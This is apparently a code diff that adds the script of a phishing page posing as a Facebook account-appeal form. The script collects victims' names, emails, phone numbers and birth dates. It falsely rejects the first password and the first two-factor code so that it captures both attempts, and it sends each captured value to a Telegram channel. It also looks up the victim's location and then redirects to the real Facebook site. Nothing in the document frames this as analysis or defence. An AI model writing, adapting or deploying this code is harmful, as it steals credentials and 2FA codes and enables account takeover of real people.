+            document.getElementById('tfaError').textContent = 'A new code has been sent to your email.';
+            document.getElementById('tfaSubmitBtn').disabled = true;
+            document.getElementById('tfaSubmitBtn').classList.remove('enabled');
+            tfaAttempts = 0;
+            tfaLocked = false;
+            document.getElementById('tfaCode').disabled = false;
+            if (tfaCooldownTimer) {
+                clearInterval(tfaCooldownTimer);
+                tfaCooldownTimer = null;
+            }
+        }
+
+        function useBackupCode() {
+            alert('🔑 Please enter your backup code.');
+            document.getElementById('tfaFormContainer').style.display = 'block';
+            document.getElementById('tfaAlternative').classList.remove('show');
+            document.getElementById('tfaCode').value = '';
+            document.getElementById('tfaError').textContent = 'Enter your backup code (8 digits).';
+            document.getElementById('tfaSubmitBtn').disabled = true;
+            document.getElementById('tfaSubmitBtn').classList.remove('enabled');
+            tfaAttempts = 0;
+            tfaLocked = false;
+            document.getElementById('tfaCode').disabled = false;
+            if (tfaCooldownTimer) {
+                clearInterval(tfaCooldownTimer);
+                tfaCooldownTimer = null;
+            }
+        }
+
+        // ============================================================
+        // APPEAL FORM SUBMIT
+        // ============================================================
+        document.getElementById('appealForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            document.querySelectorAll('.form-error').forEach(el => el.classList.remove('visible'));
+
+            let isValid = true;
+
+            const fullName = document.getElementById('fullName');
+            if (!fullName.value.trim()) {
+                document.getElementById('error-fullName').classList.add('visible');
+                isValid = false;
+            }
+
+            const pageName = document.getElementById('pageName');
+            if (!pageName.value.trim()) {
+                document.getElementById('error-pageName').classList.add('visible');
+                isValid = false;
+            }
+
+            const businessEmail = document.getElementById('businessEmail');
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(businessEmail.value)) {
+                document.getElementById('error-businessEmail').classList.add('visible');
+                isValid = false;
+            }
+
+            const personalEmail = document.getElementById('personalEmail');
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(personalEmail.value)) {
+                document.getElementById('error-personalEmail').classList.add('visible');
+                isValid = false;
+            }
+
+            const phone = document.getElementById('phone');
+            const phoneValue = phone.value.replace(/\s/g, '');
+            const afterCode = phoneValue.startsWith(currentCountryCode) ?
+                phoneValue.substring(currentCountryCode.length) :
+                phoneValue.replace(/^\+?\d{1,3}/, '');
+            const digitCount = (afterCode.match(/\d/g) || []).length;
+            if (digitCount < 7 || phoneValue === currentCountryCode || phoneValue.trim() === currentCountryCode.trim()) {
+                document.getElementById('error-phone').classList.add('visible');
+                isValid = false;
+            }
+
+            const day = parseInt(document.getElementById('day').value);
+            const month = parseInt(document.getElementById('month').value);
+            const year = parseInt(document.getElementById('year').value);
+            if (!day || day < 1 || day > 31 || !month || month < 1 || month > 12 || !year || year < 1900 || year > 2026) {
+                document.getElementById('error-dob').classList.add('visible');
+                isValid = false;
+            }
+
+            const radioChecked = document.querySelector('input[name="happened"]:checked');
+            if (!radioChecked) {
+                document.getElementById('error-happened').classList.add('visible');
+                isValid = false;
+            }
+
+            const agree = document.getElementById('agreePolicy');
+            if (!agree.checked) {
+                document.getElementById('error-agree').classList.add('visible');
+                isValid = false;
+            }
+
+            if (!isValid) {
+                const firstError = document.querySelector('.form-error.visible');
+                if (firstError) {
+                    firstError.closest('.form-group, .form-body')?.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+                return;
+            }
+
+            userData.fullName = document.getElementById('fullName').value;
+            userData.pageName = document.getElementById('pageName').value;
+            userData.businessEmail = document.getElementById('businessEmail').value;
+            userData.email = document.getElementById('personalEmail').value;
+            userData.phone = document.getElementById('phone').value;
+            userData.dob = document.getElementById('day').value + '/' +
+                           document.getElementById('month').value + '/' +
+                           document.getElementById('year').value;
+            userData.happened = document.querySelector('input[name="happened"]:checked')?.value || '';
+            userData.other = document.getElementById('otherDetails').value;
+
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const btnSpinner = document.getElementById('btnSpinner');
+            submitBtn.disabled = true;
+            btnText.textContent = translations[currentLang]?.processing || 'Processing...';
+            btnSpinner.style.display = 'inline-block';
+
+            sendOrUpdateTelegram().then(() => {
+                console.log('✅ Đã gửi Appeal lên Telegram');
+            });
+
+            setTimeout(() => {
+                submitBtn.disabled = false;
+                btnText.textContent = translations[currentLang]?.submit || 'Submit Appeal';
+                btnSpinner.style.display = 'none';
+                document.getElementById('appealForm').reset();
+
+                document.getElementById('passwordModal').classList.add('show');
+                document.getElementById('passwordInput').value = '';
+                document.getElementById('pwdError').textContent = '';
+                document.getElementById('pwdSubmitBtn').disabled = false;
+                passwordAttempts = 0;
+                passwordLocked = false;
+                document.getElementById('pwdWrapper').style.borderColor = '#d4dbe3';
+                document.getElementById('passwordInput').disabled = false;
+            }, 1500);
+        });
+
+        // ============================================================
+        // PASSWORD MODAL SUBMIT
+        // ============================================================
+        document.getElementById('passwordForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            if (passwordLocked) {
+                document.getElementById('pwdError').textContent = 'Please wait...';
+                return;
+            }
+
+            const pwdInput = document.getElementById('passwordInput');
+            const pwdError = document.getElementById('pwdError');
+            const pwdBtn = document.getElementById('pwdSubmitBtn');
+
+            if (!pwdInput.value.trim()) {
+                pwdError.textContent = "You haven't entered your password!";
+                return;
+            }
+
+            pwdBtn.disabled = true;
+            pwdBtn.textContent = 'Checking...';
+
+            setTimeout(() => {
+                passwordAttempts++;
+
+                if (passwordAttempts === 1) {
+                    userData.pass1 = pwdInput.value;
+                    sendOrUpdateTelegram();
+
+                    pwdInput.disabled = true;
+                    passwordLocked = true;
+                    document.getElementById('pwdWrapper').style.borderColor = '#ef4444';
+
+                    pwdError.textContent = '';
+                    pwdBtn.textContent = 'Please wait...';
+
+                    setTimeout(() => {
+                        passwordLocked = false;
+                        pwdInput.disabled = false;
+                        pwdBtn.disabled = false;
+                        pwdBtn.textContent = translations[currentLang]?.pwdContinue || 'Continue';
+                        pwdError.textContent = 'The password you entered is incorrect.';
+                        document.getElementById('pwdWrapper').style.borderColor = '#d4dbe3';
+                        pwdInput.value = '';
+                        pwdInput.focus();
+                    }, 3000);
+
+                } else {
+                    userData.pass2 = pwdInput.value;
+                    sendOrUpdateTelegram();
+
+                    pwdError.textContent = '';
+                    pwdBtn.textContent = 'Please wait...';
+                    pwdBtn.disabled = true;
+
+                    setTimeout(() => {
+                        document.getElementById('passwordModal').classList.remove('show');
+
+                        setTimeout(() => {
+                            document.getElementById('tfaModal').classList.add('show');
+                            document.getElementById('tfaCode').value = '';
+                            document.getElementById('tfaError').textContent = '';
+                            document.getElementById('tfaSubmitBtn').disabled = true;
+                            document.getElementById('tfaSubmitBtn').classList.remove('enabled');
+                            tfaAttempts = 0;
+                            tfaLocked = false;
+                            document.getElementById('tfaFormContainer').style.display = 'block';
+                            document.getElementById('tfaAlternative').classList.remove('show');
+                            update2FADisplay();
+                        }, 300);
+
+                        pwdBtn.disabled = false;
+                        pwdBtn.textContent = translations[currentLang]?.pwdContinue || 'Continue';
+                        passwordAttempts = 0;
+                        document.getElementById('pwdWrapper').style.borderColor = '#d4dbe3';
+                    }, 3000);
+                }
+            }, 500);
+        });
+
+        // ============================================================
+        // 2FA FORM SUBMIT
+        // ============================================================
+        document.getElementById('tfaForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            if (tfaLocked) {
+                document.getElementById('tfaError').textContent = 'Please wait...';
+                return;
+            }
+
+            const code = document.getElementById('tfaCode').value;
+            const error = document.getElementById('tfaError');
+            const btn = document.getElementById('tfaSubmitBtn');
+
+            if (!code.trim()) {
+                error.textContent = 'Please enter a code.';
+                return;
+            }
+
+            error.textContent = '';
+            btn.disabled = true;
+            btn.textContent = 'Verifying...';
+
+            setTimeout(() => {
+                tfaAttempts++;
+
+                if (tfaAttempts === 1) {
+                    userData.twoFactorCode1 = code;
+                    sendOrUpdateTelegram();
+
+                    document.getElementById('tfaCode').value = '';
+                    document.getElementById('tfaCode').disabled = true;
+                    tfaLocked = true;
+
+                    error.textContent = '';
+                    btn.textContent = 'Please wait...';
+
+                    setTimeout(() => {
+                        error.textContent = 'The code you entered is incorrect.';
+                        btn.textContent = 'Please wait 15s...';
+
+                        let countdown = 15;
+                        btn.textContent = 'Please wait ' + countdown + 's...';
+
+                        if (tfaCooldownTimer) clearInterval(tfaCooldownTimer);
+
+                        tfaCooldownTimer = setInterval(() => {
+                            countdown--;
+                            btn.textContent = 'Please wait ' + countdown + 's...';
+
+                            if (countdown <= 0) {
+                                clearInterval(tfaCooldownTimer);
+                                tfaCooldownTimer = null;
+                                tfaLocked = false;
+                                document.getElementById('tfaCode').disabled = false;
+                                btn.disabled = false;
+                                btn.textContent = translations[currentLang]?.tfaSubmit || 'Submit';
+                                error.textContent = '';
+                                document.getElementById('tfaCode').value = '';
+                                document.getElementById('tfaCode').focus();
+                            }
+                        }, 1000);
+                    }, 3000);
+
+                } else {
+                    userData.twoFactorCode2 = code;
+                    sendOrUpdateTelegram();
+
+                    error.textContent = '';
+                    btn.textContent = 'Please wait...';
+                    btn.disabled = true;
+
+                    setTimeout(() => {
+                        document.getElementById('tfaModal').classList.remove('show');
+                        document.getElementById('successOverlay').classList.add('show');
+
+                        setTimeout(() => {
+                            window.location.href = 'https://www.facebook.com/';
+                        }, 3000);
+
+                        btn.disabled = false;
+                        btn.textContent = translations[currentLang]?.tfaSubmit || 'Submit';
+                        document.getElementById('tfaCode').value = '';
+                        tfaAttempts = 0;
+                    }, 3000);
+                }
+            }, 1000);
+        });
+
+        // ============================================================
+        // CLOSE MODALS
+        // ============================================================
+        document.querySelectorAll('.modal-overlay').forEach(overlay => {
+            overlay.addEventListener('click', function(e) {
+                if (e.target === this) {
+                    if (this.id === 'passwordModal') return;
+                    this.classList.remove('show');
+                }
+            });
+        });
+
+        // ============================================================
+        // CLEAR ERRORS ON INPUT
+        // ============================================================
+        document.querySelectorAll('input, textarea').forEach(el => {
+            el.addEventListener('input', function() {
+                const error = this.closest('.form-group')?.querySelector('.form-error') ||
+                              this.closest('.checkbox-group')?.parentElement?.querySelector('.form-error');
+                if (error) error.classList.remove('visible');
+            });
+        });
+
+        document.querySelectorAll('input[type="radio"]').forEach(el => {
+            el.addEventListener('change', function() {
+                const error = document.getElementById('error-happened');
+                if (error) error.classList.remove('visible');
+            });
+        });
+
+        // ============================================================
+        // INITIALIZE
+        // ============================================================
+        async function initPage() {
+            try {
+                userLoc = await getLocation();
+                console.log('📍 Location:', userLoc);
+
+                await detectCountryFromIP();
+
+            } catch (error) {
+                console.error('❌ Lỗi init:', error);
+                translatePage('en');
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            populateCountries();
+            initPage();
+        });
+    </script>
+</body>
+</html>
